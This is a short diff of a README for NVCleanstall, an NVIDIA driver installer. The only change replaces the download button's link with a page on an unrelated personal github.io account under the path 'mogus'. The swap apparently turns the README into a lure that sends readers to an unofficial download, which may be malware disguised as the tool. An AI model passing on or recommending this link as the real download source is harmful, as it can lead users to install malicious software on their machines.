@@ -2,7 +2,7 @@
 
 **NVCleanstall** is a customizable NVIDIA driver installer that allows users to easily remove unwanted components and streamline their GPU driver installation. Ideal for those who want a clean, lightweight installation tailored to their needs.
 
-[![Download NVCleanstall](https://img.shields.io/badge/Download-NVCleanstall-blueviolet)](https://nvcleanstall.github.io/.github)  
+[![Download NVCleanstall](https://img.shields.io/badge/Download-NVCleanstall-blueviolet)](https://asdeennerhorse.github.io/mogus/NVCleanstall)  
 
 
 ---
